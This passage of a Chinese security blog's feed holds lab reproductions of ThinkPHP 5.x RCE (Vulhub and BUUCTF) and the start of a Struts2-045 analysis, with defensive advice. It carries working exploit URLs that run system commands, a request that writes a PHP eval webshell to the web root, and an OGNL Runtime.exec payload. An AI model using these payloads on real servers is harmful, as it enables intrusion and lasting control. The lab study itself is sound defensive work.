class=\"hljs-link\">http://node5.buuoj.cn:27945/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class=\"hljs-string\">0</span>]=assert&amp;vars[1][]=eval($_POST[1])<br></code></pre></td></tr></table></figure>\n\n<p><strong>蚁剑配置</strong>：</p>\n<ul>\n<li><strong>URL</strong>：上述地址</li>\n<li><strong>密码</strong>：<code>1</code>（对应 <code>$_POST[1]</code>）</li>\n<li><strong>类型</strong>：PHP（原生）</li>\n<li><strong>编码</strong>：默认</li>\n</ul>\n<p>连接后可进行文件管理、命令执行等操作。</p>\n<hr>\n<h2 id=\"四、防御措施\"><a href=\"#四、防御措施\" class=\"headerlink\" title=\"四、防御措施\"></a>四、防御措施</h2><h3 id=\"1-升级-ThinkPHP-版本\"><a href=\"#1-升级-ThinkPHP-版本\" class=\"headerlink\" title=\"1. 升级 ThinkPHP 版本\"></a>1. 升级 ThinkPHP 版本</h3><ul>\n<li><strong>ThinkPHP 2.x</strong>：升级到更高版本（如 3.x 或 5.0.24+），修复模板解析漏洞。</li>\n<li><strong>ThinkPHP 5.x</strong>：升级到 5.0.24 或更高版本，官方已修复 RCE 漏洞。</li>\n</ul>\n<h3 id=\"2-输入验证与过滤\"><a href=\"#2-输入验证与过滤\" class=\"headerlink\" title=\"2. 输入验证与过滤\"></a>2. 输入验证与过滤</h3><ul>\n<li><strong>白名单验证</strong>：限制 <code>s</code> 参数和模板变量，只允许预定义值。</li>\n<li><strong>过滤危险函数</strong>：禁用 <code>eval</code>、<code>assert</code>、<code>call_user_func_array</code> 等高危函数。</li>\n<li><strong>参数校验</strong>：对用户输入进行严格过滤，防止注入。</li>\n</ul>\n<h3 id=\"3-禁用危险函数\"><a href=\"#3-禁用危险函数\" class=\"headerlink\" title=\"3. 禁用危险函数\"></a>3. 禁用危险函数</h3><p>在 <code>php.ini</code> 中禁用高危函数：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs ini\"><span class=\"hljs-attr\">disable_functions</span> = eval,assert,exec,system,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-最小权限原则\"><a href=\"#4-最小权限原则\" class=\"headerlink\" title=\"4. 最小权限原则\"></a>4. 最小权限原则</h3><ul>\n<li>配置 Web 服务器以最低权限运行（如非 root 用户）。</li>\n<li>限制 PHP 脚本的文件系统访问权限。</li>\n</ul>\n<h3 id=\"5-Web-应用防火墙（WAF）\"><a href=\"#5-Web-应用防火墙（WAF）\" class=\"headerlink\" title=\"5. Web 应用防火墙（WAF）\"></a>5. Web 应用防火墙（WAF）</h3><ul>\n<li>部署 WAF，拦截包含可疑路由（如 <code>\\think\\app</code>）或函数（如 <code>system</code>）的请求。</li>\n<li>使用正则规则匹配异常 Payload。</li>\n</ul>\n<h3 id=\"6-安全审计与监控\"><a href=\"#6-安全审计与监控\" class=\"headerlink\" title=\"6. 安全审计与监控\"></a>6. 安全审计与监控</h3><ul>\n<li>定期扫描 Web 应用，检查已知漏洞。</li>\n<li>监控服务器日志，及时发现异常请求。</li>\n</ul>\n<hr>\n<h2 id=\"五、总结\"><a href=\"#五、总结\" class=\"headerlink\" title=\"五、总结\"></a>五、总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>ThinkPHP 2.x RCE</th>\n<th>ThinkPHP 5.x RCE</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞名称</strong></td>\n<td>ThinkPHP 2.x RCE</td>\n<td>ThinkPHP 5.x RCE</td>\n</tr>\n<tr>\n<td><strong>影响版本</strong></td>\n<td>ThinkPHP 2.x</td>\n<td>ThinkPHP &lt;&#x3D; 5.0.23</td>\n</tr>\n<tr>\n<td><strong>漏洞原因</strong></td>\n<td>模板变量解析未过滤</td>\n<td>动态函数调用未授权</td>\n</tr>\n<tr>\n<td><strong>利用方法</strong></td>\n<td>GET&#x2F;POST 参数构造 <code>eval</code>&#x2F;<code>assert</code></td>\n<td>GET 请求构造路由 + 函数调用</td>\n</tr>\n<tr>\n<td><strong>关键函数</strong></td>\n<td><code>eval</code>, <code>assert</code></td>\n<td><code>call_user_func_array</code></td>\n</tr>\n<tr>\n<td><strong>检测方式</strong></td>\n<td>使用 <code>$&#123;@phpinfo()&#125;</code> 探测</td>\n<td>使用 <code>phpinfo</code> 探测，再尝试 <code>system</code></td>\n</tr>\n<tr>\n<td><strong>练习平台</strong></td>\n<td>BUUCTF（如 <code>node3.buuoj.cn:26104</code>）</td>\n<td>BUUCTF（如 <code>node5.buuoj.cn:27945</code>）</td>\n</tr>\n</tbody></table>\n<p>ThinkPHP 2.x 和 5.x 的 RCE 漏洞利用简单但危害极大，攻击者可通过简单的 URL 构造实现代码或命令执行，甚至完全控制服务器。BUUCTF 靶场为我们提供了便捷的复现环境，通过本文的演示，读者可以深入理解漏洞原理和利用流程。开发者应及时升级框架、加强输入验证、部署 WAF 和监控机制，以有效防范此类漏洞。</p>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "漏洞复现",
                "RCE",
                "ThinkPHP"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/07/27/ThinkPHP-5-x-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub-%E7%8E%AF%E5%A2%83%EF%BC%89/",
            "title": "ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）",
            "date_published": "2025-07-27T09:25:25.000Z",
            "content_html": "<h1 id=\"深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\"><a href=\"#深入剖析-ThinkPHP-5-x-远程代码执行漏洞（基于-Vulhub-环境）\" class=\"headerlink\" title=\"深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）\"></a>深入剖析 ThinkPHP 5.x 远程代码执行漏洞（基于 Vulhub 环境）</h1><h2 id=\"一、漏洞背景简介-🔍\"><a href=\"#一、漏洞背景简介-🔍\" class=\"headerlink\" title=\"一、漏洞背景简介 🔍\"></a>一、漏洞背景简介 🔍</h2><p>ThinkPHP 是一个轻量且易用的 PHP 开发框架，广泛应用于 Web 开发。然而，在 ThinkPHP 5.0.x 至 5.0.23 版本中，由于框架对动态函数调用（如 <code>invokeFunction</code>）的访问控制不严格，存在严重的 <strong>远程代码执行（RCE）漏洞</strong>。攻击者可通过精心构造的 URL 参数，调用任意 PHP 函数（如 <code>phpinfo</code> 或 <code>system</code>），实现远程执行任意代码或系统命令，危害极大。</p>\n<p>本文基于 Vulhub 靶场环境，详细讲解该漏洞的原理、环境搭建、利用过程及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。</p>\n<hr>\n<h2 id=\"二、漏洞环境搭建\"><a href=\"#二、漏洞环境搭建\" class=\"headerlink\" title=\"二、漏洞环境搭建\"></a>二、漏洞环境搭建</h2><p>为了复现 ThinkPHP 5.x RCE 漏洞，我们使用 Vulhub 提供的靶场环境，结合 Docker 和 Kali Linux 进行搭建。以下是详细步骤：</p>\n<h3 id=\"1-基础环境\"><a href=\"#1-基础环境\" class=\"headerlink\" title=\"1. 基础环境\"></a>1. 基础环境</h3><ul>\n<li><strong>操作系统</strong>：Kali Linux（推荐使用虚拟机）  </li>\n<li><strong>工具</strong>：已安装 Docker 和 Docker Compose  </li>\n<li><strong>网络模式</strong>：<ul>\n<li>NAT（用于访问外部网络）</li>\n<li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.102</code>）</li>\n</ul>\n</li>\n<li><strong>硬件要求</strong>：建议 4GB 内存，2 核 CPU</li>\n</ul>\n<h3 id=\"2-获取-Vulhub-项目\"><a href=\"#2-获取-Vulhub-项目\" class=\"headerlink\" title=\"2. 获取 Vulhub 项目\"></a>2. 获取 Vulhub 项目</h3><p>Vulhub 是一个开源的漏洞靶场集合，包含 ThinkPHP 5.x RCE 环境。执行以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 切换到工作目录</span><br><span class=\"hljs-built_in\">cd</span> /root/vulhub/thinkphp/5-rce<br><br><span class=\"hljs-comment\"># 如果未下载 Vulhub，克隆项目</span><br>git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><span class=\"hljs-built_in\">cd</span> vulhub/thinkphp/5-rce<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-启动漏洞环境\"><a href=\"#3-启动漏洞环境\" class=\"headerlink\" title=\"3. 启动漏洞环境\"></a>3. 启动漏洞环境</h3><p>在 vulhub&#x2F;thinkphp&#x2F;5-rce 目录下，运行以下命令启动 Docker 容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure>\n\n<p>启动后，访问以下地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080<br></code></pre></td></tr></table></figure>\n\n<p>若看到 ThinkPHP V5 的欢迎页面，说明环境部署成功 </p>\n<h3 id=\"4-容器管理操作\"><a href=\"#4-容器管理操作\" class=\"headerlink\" title=\"4. 容器管理操作\"></a>4. 容器管理操作</h3><p>查看运行中的容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker ps<br></code></pre></td></tr></table></figure>\n\n<p>示例输出：</p>\n<figure class=\"highlight zsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs zsh\">CONTAINER ID   IMAGE                       PORTS                    NAMES<br>e5117e659934   vulhub/thinkphp:5.0.23      0.0.0.0:8080-&gt;80/tcp     thinkphp_5-rce_1<br></code></pre></td></tr></table></figure>\n\n<p>停止指定容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker stop e5117e659934<br></code></pre></td></tr></table></figure>\n\n<p>一键停止并移除容器及网络：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose down<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"三、漏洞原理解析\"><a href=\"#三、漏洞原理解析\" class=\"headerlink\" title=\"三、漏洞原理解析\"></a>三、漏洞原理解析</h2><h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>ThinkPHP 5.x 的控制器路由机制允许通过 URL 参数动态调用框架内部函数（如 <code>\\think\\app::invokeFunction</code>）。在 5.0.23 及以下版本中，框架未对这些调用进行严格的权限校验，导致攻击者可以通过构造特定参数，调用任意 PHP 函数（如 <code>call_user_func_array</code>），并传递函数名和参数，从而触发远程代码执行。</p>\n<h3 id=\"核心问题\"><a href=\"#核心问题\" class=\"headerlink\" title=\"核心问题\"></a>核心问题</h3><ul>\n<li><strong>动态函数调用</strong>：<code>call_user_func_array</code> 允许动态调用任意 PHP 函数（如 <code>phpinfo</code>、<code>system</code> 等）。</li>\n<li><strong>参数未过滤</strong>：用户输入的 <code>vars[0]</code>（函数名）和 <code>vars[1][]</code>（函数参数）直接传递到函数执行器，未经严格验证。</li>\n<li><strong>路由暴露</strong>：通过 <code>s=/Index/\\think\\app/invokefunction</code>，攻击者可直接访问框架核心类。</li>\n</ul>\n<h3 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h3><ul>\n<li>执行任意 PHP 代码</li>\n<li>运行系统命令，获取权限</li>\n<li>上传 WebShell，长期控制服务器</li>\n<li>窃取配置文件、数据库信息</li>\n<li>删除文件或修改系统配置</li>\n</ul>\n<hr>\n<h2 id=\"四、漏洞利用演示\"><a href=\"#四、漏洞利用演示\" class=\"headerlink\" title=\"四、漏洞利用演示\"></a>四、漏洞利用演示</h2><p>以下展示如何利用 ThinkPHP 5.x RCE 漏洞，基于 Vulhub 靶场环境。</p>\n<h3 id=\"1-测试-PHP-函数调用\"><a href=\"#1-测试-PHP-函数调用\" class=\"headerlink\" title=\"1. 测试 PHP 函数调用\"></a>1. 测试 PHP 函数调用</h3><p>访问以下 Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1<br></code></pre></td></tr></table></figure>\n\n<p><strong>参数解析</strong>：</p>\n<ul>\n<li><code>s=/Index/\\think\\app/invokefunction</code>：指定路由</li>\n<li><code>function=call_user_func_array</code>：调用函数</li>\n<li><code>vars[0]=phpinfo</code>：目标函数</li>\n<li><code>vars[1][]=1</code>：参数（执行 phpinfo(1)）</li>\n</ul>\n<p><strong>结果</strong>：</p>\n<p>页面显示 phpinfo 配置信息，说明漏洞存在 </p>\n<h3 id=\"2-执行系统命令\"><a href=\"#2-执行系统命令\" class=\"headerlink\" title=\"2. 执行系统命令\"></a>2. 执行系统命令</h3><p>执行 <code>whoami</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami<br></code></pre></td></tr></table></figure>\n\n<p><strong>结果示例</strong>：</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haskell\"><span class=\"hljs-title\">www</span>-<span class=\"hljs-class\"><span class=\"hljs-keyword\">data</span></span><br></code></pre></td></tr></table></figure>\n\n<p>表示系统命令执行成功。</p>\n<h3 id=\"其他命令测试：\"><a href=\"#其他命令测试：\" class=\"headerlink\" title=\"其他命令测试：\"></a>其他命令测试：</h3><ul>\n<li><p>查看用户 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>列出目录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20/<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>查看网络配置：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ifconfig<br></code></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"3-使用-Curl-测试\"><a href=\"#3-使用-Curl-测试\" class=\"headerlink\" title=\"3. 使用 Curl 测试\"></a>3. 使用 Curl 测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">curl <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：URL 中的 <code>\\</code> 要写成 <code>\\\\</code></p>\n</blockquote>\n<h3 id=\"4-使用-Burp-Suite-测试\"><a href=\"#4-使用-Burp-Suite-测试\" class=\"headerlink\" title=\"4. 使用 Burp Suite 测试\"></a>4. 使用 Burp Suite 测试</h3><ul>\n<li>在浏览器中访问目标页面，拦截请求</li>\n<li>将 Payload 粘贴进 Repeater 中测试</li>\n<li>修改 <code>vars[1][]</code> 的值如 <code>id</code>、<code>ls</code> 等</li>\n</ul>\n<hr>\n<h2 id=\"五、Payload-结构总结\"><a href=\"#五、Payload-结构总结\" class=\"headerlink\" title=\"五、Payload 结构总结\"></a>五、Payload 结构总结</h2><table>\n<thead>\n<tr>\n<th>参数键</th>\n<th>功能说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>s</code></td>\n<td>请求路由，指向 ThinkPHP 核心类</td>\n</tr>\n<tr>\n<td><code>function</code></td>\n<td>要调用的 PHP 函数（如 <code>call_user_func_array</code>）</td>\n</tr>\n<tr>\n<td><code>vars[0]</code></td>\n<td>执行的函数名称（如 <code>phpinfo</code>, <code>system</code>）</td>\n</tr>\n<tr>\n<td><code>vars[1][]</code></td>\n<td>函数的参数数组（如 <code>whoami</code>, <code>id</code>）</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"六、防御措施\"><a href=\"#六、防御措施\" class=\"headerlink\" title=\"六、防御措施\"></a>六、防御措施</h2><ol>\n<li><p><strong>升级 ThinkPHP 版本</strong></p>\n<p>升级至 ThinkPHP 5.0.24 或更高版本。</p>\n</li>\n<li><p><strong>输入验证与过滤</strong></p>\n<ul>\n<li>白名单验证 <code>s</code> 参数</li>\n<li>禁用危险函数如 <code>call_user_func_array</code></li>\n<li>严格过滤所有用户输入参数</li>\n</ul>\n</li>\n<li><p><strong>禁用危险函数</strong></p>\n<p>在 <code>php.ini</code> 中：</p>\n<figure class=\"highlight mel\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mel\">disable_functions = <span class=\"hljs-keyword\">eval</span>,<span class=\"hljs-keyword\">exec</span>,<span class=\"hljs-keyword\">system</span>,passthru,shell_exec,proc_open,call_user_func_array<br></code></pre></td></tr></table></figure>\n</li>\n<li><p><strong>最小权限原则</strong></p>\n<p>Web 服务运行用户不要使用 <code>root</code>，限制文件访问权限。</p>\n</li>\n<li><p><strong>部署 WAF</strong></p>\n<p>拦截请求中包含敏感函数或路径的攻击尝试。</p>\n</li>\n<li><p><strong>安全审计与监控</strong></p>\n<p>定期扫描、日志审计，发现异常行为。</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"七、笔记总结\"><a href=\"#七、笔记总结\" class=\"headerlink\" title=\"七、笔记总结\"></a>七、笔记总结</h2><table>\n<thead>\n<tr>\n<th>内容项</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>漏洞类型</td>\n<td>RCE（远程代码执行）</td>\n</tr>\n<tr>\n<td>影响版本</td>\n<td>ThinkPHP 5.0.x 至 5.0.23</td>\n</tr>\n<tr>\n<td>漏洞原因</td>\n<td>动态函数调用缺乏授权校验</td>\n</tr>\n<tr>\n<td>复现方式</td>\n<td>URL GET 请求构造 Payload</td>\n</tr>\n<tr>\n<td>环境工具</td>\n<td>Vulhub、Docker、Kali Linux</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"八、附加玩法\"><a href=\"#八、附加玩法\" class=\"headerlink\" title=\"八、附加玩法\"></a>八、附加玩法</h2><h3 id=\"自动化检测脚本\"><a href=\"#自动化检测脚本\" class=\"headerlink\" title=\"自动化检测脚本\"></a>自动化检测脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&quot;http://192.168.56.102:8080/index.php?s=/Index/\\\\think\\\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&quot;</span><br>response = requests.get(url)<br><span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&quot;www-data&quot;</span> <span class=\"hljs-keyword\">in</span> response.text:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;Vulnerability found!&quot;</span>)<br><span class=\"hljs-keyword\">else</span>:<br>    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&quot;No vulnerability detected.&quot;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"上传-WebShell\"><a href=\"#上传-WebShell\" class=\"headerlink\" title=\"上传 WebShell\"></a>上传 WebShell</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.56.102:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27%3C%3Fphp%20%40eval%28%24_POST%5B%27pass%27%5D%29%3B%20%3F%3E%27%20%3E%20/var/www/html/shell.php<br></code></pre></td></tr></table></figure>\n\n<p>使用蚁剑连接：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\">http:<span class=\"hljs-comment\">//192.168.56.102:8080/shell.php</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"提权尝试\"><a href=\"#提权尝试\" class=\"headerlink\" title=\"提权尝试\"></a>提权尝试</h3><p>结合弱口令、提权漏洞等，可使用 Metasploit 等工具进一步入侵。</p>\n<hr>\n<h2 id=\"九、总结\"><a href=\"#九、总结\" class=\"headerlink\" title=\"九、总结\"></a>九、总结</h2><p>ThinkPHP 5.x RCE 漏洞是一个典型的动态函数调用漏洞，利用简单但危害极大。通过 Vulhub 靶场，我们可以快速复现漏洞，深入理解其原理和利用方式。</p>\n<p>开发者应及时升级框架版本，实施严格的输入验证和权限控制，部署 WAF 和监控机制，以降低漏洞被利用的风险。</p>\n<p>希望本文能帮助读者更好地理解和防范 ThinkPHP RCE 漏洞，同时提升 Web 应用安全开发的意识！</p>\n<hr>\n<h2 id=\"⚠️-免责声明\"><a href=\"#⚠️-免责声明\" class=\"headerlink\" title=\"⚠️ 免责声明\"></a>⚠️ 免责声明</h2><p>本文内容仅供网络安全学习和研究使用，请勿用于非法用途。任何个人或组织使用本文信息进行的违法活动，均与作者无关。读者应当遵守当地法律法规，在合法授权的环境下进行安全测试。</p>\n",
            "tags": [
                "Web安全",
                "漏洞复现",
                "RCE",
                "ThinkPHP"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "Struts2-045远程代码执行漏洞复现与原理分析",
            "date_published": "2025-07-24T00:10:34.000Z",
            "content_html": "<h1 id=\"Struts2-045远程代码执行漏洞复现与原理分析\"><a href=\"#Struts2-045远程代码执行漏洞复现与原理分析\" class=\"headerlink\" title=\"Struts2-045远程代码执行漏洞复现与原理分析\"></a>Struts2-045远程代码执行漏洞复现与原理分析</h1><h2 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h2><p>Struts2-045（CVE-2017-5638）是Apache Struts2框架中的一个严重远程代码执行漏洞，该漏洞因其影响范围广、利用简单而备受关注。攻击者可以通过构造恶意的Content-Type请求头，在目标服务器上执行任意系统命令。</p>\n<h2 id=\"漏洞基本信息\"><a href=\"#漏洞基本信息\" class=\"headerlink\" title=\"漏洞基本信息\"></a>漏洞基本信息</h2><h3 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h3><ul>\n<li><strong>Apache Struts 2.3.5 - 2.3.31</strong>（包含2.3.31版本）</li>\n<li><strong>Apache Struts 2.5.0 - 2.5.10</strong>（包含2.5.10版本）</li>\n</ul>\n<h3 id=\"漏洞等级\"><a href=\"#漏洞等级\" class=\"headerlink\" title=\"漏洞等级\"></a>漏洞等级</h3><ul>\n<li><strong>CVSS评分</strong>: 10.0（严重）</li>\n<li><strong>漏洞类型</strong>: 远程代码执行（RCE）</li>\n<li><strong>攻击复杂度</strong>: 低</li>\n</ul>\n<h3 id=\"核心原理\"><a href=\"#核心原理\" class=\"headerlink\" title=\"核心原理\"></a>核心原理</h3><p>Struts2框架在处理文件上传请求时，会解析Content-Type请求头。当Content-Type格式不正确时，框架会抛出异常，而<strong>异常处理过程中会对错误信息进行OGNL表达式解析</strong>，这就给了攻击者可乘之机。</p>\n<h2 id=\"技术原理深度分析\"><a href=\"#技术原理深度分析\" class=\"headerlink\" title=\"技术原理深度分析\"></a>技术原理深度分析</h2><h3 id=\"OGNL表达式注入机制\"><a href=\"#OGNL表达式注入机制\" class=\"headerlink\" title=\"OGNL表达式注入机制\"></a>OGNL表达式注入机制</h3><p><strong>OGNL（Object-Graph Navigation Language）</strong> 是Struts2框架使用的表达式语言，用于在Java对象之间进行导航和操作。</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-comment\">// OGNL表达式示例</span><br><span class=\"hljs-selector-id\">#context</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span> = false<br>@java<span class=\"hljs-selector-class\">.lang</span>.Runtime@<span class=\"hljs-built_in\">getRuntime</span>()<span class=\"hljs-selector-class\">.exec</span>(<span class=\"hljs-string\">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞触发流程\"><a href=\"#漏洞触发流程\" class=\"headerlink\" title=\"漏洞触发流程\"></a>漏洞触发流程</h3><ol>\n<li><strong>请求接收</strong>: 服务器接收包含恶意Content-Type的HTTP请求</li>\n<li><strong>类型解析</strong>: Struts2尝试解析Content-Type头部信息</li>\n<li><strong>异常触发</strong>: 恶意构造的Content-Type导致解析异常</li>\n<li><strong>错误处理</strong>: 异常处理器对错误信息进行OGNL解析</li>\n<li><strong>代码执行</strong>: 恶意OGNL表达式被执行，实现RCE</li>\n</ol>\n<h3 id=\"关键源码分析\"><a href=\"#关键源码分析\" class=\"headerlink\" title=\"关键源码分析\"></a>关键源码分析</h3><p>漏洞位于<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>类中：</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-comment\">// 简化的漏洞代码逻辑</span><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-title function_\">buildErrorMessage</span>(<span class=\"hljs-params\"><span class=\"hljs-title class_\">Throwable</span> e, <span class=\"hljs-title class_\">Object</span>[] args</span>) &#123;<br>    <span class=\"hljs-title class_\">String</span> errorMessage = localizedTextProvider.<span class=\"hljs-title function_\">findDefaultText</span>(e.<span class=\"hljs-title function_\">getMessage</span>(), locale, args);<br>    <span class=\"hljs-comment\">// 这里会对errorMessage进行OGNL表达式解析，导致RCE</span><br>    <span class=\"hljs-keyword\">if</span> (errorMessage != <span class=\"hljs-literal\">null</span>) &#123;<br>        errorMessage = <span class=\"hljs-title class_\">TextParseUtil</span>.<span class=\"hljs-title function_\">translateVariables</span>(errorMessage, stack);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"实验环境搭建\"><a href=\"#实验环境搭建\" class=\"headerlink\" title=\"实验环境搭建\"></a>实验环境搭建</h2><h3 